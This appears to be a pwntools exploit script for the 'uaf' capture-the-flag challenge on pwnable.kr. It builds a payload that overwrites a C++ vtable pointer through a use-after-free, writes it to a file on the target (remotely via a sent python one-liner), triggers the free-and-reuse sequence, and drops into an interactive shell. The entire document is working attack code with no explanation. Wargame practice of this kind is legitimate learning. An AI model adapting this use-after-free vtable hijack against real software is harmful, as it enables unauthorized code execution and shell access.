from pwn import *

exe = ELF("./uaf", checksec=True)

context.binary = exe

HOST = "pwnable.kr"
PORT = 10028

gdbscript = """
set follow-fork-mode child
"""

# args.LOCAL = True
# args.DEBUG = True

FILE = "myfile"
HUMAN_VTABLE = 0x404d90 + 8
PAYLOAD  = pack(HUMAN_VTABLE) + b"\x00" * 34

def conn():
    if args.LOCAL:
        with open(FILE, "wb") as f:
            f.write(PAYLOAD)
            
        r = process([exe.path, str(len(PAYLOAD)), FILE])
        if args.DEBUG:
            gdb.attach(r, gdbscript=gdbscript)
    else:
        r = remote(HOST, PORT)

        r.recvuntil(b"Good luck.")
        r.recvline()

        r.sendline(f"python3 -c 'open(\"{FILE}\", \"wb\").write(bytes.fromhex(\"{PAYLOAD.hex()}\"))'".encode())
        r.sendline(f"./uaf {len(PAYLOAD)} {FILE}".encode())

    return r

def main():
    r = conn()

    r.sendlineafter(b"free\n", b"3")
    r.sendlineafter(b"free\n", b"2")
    r.sendlineafter(b"free\n", b"2")
    r.sendlineafter(b"free\n", b"1")
    
    r.interactive()

if __name__ == "__main__":
    main()
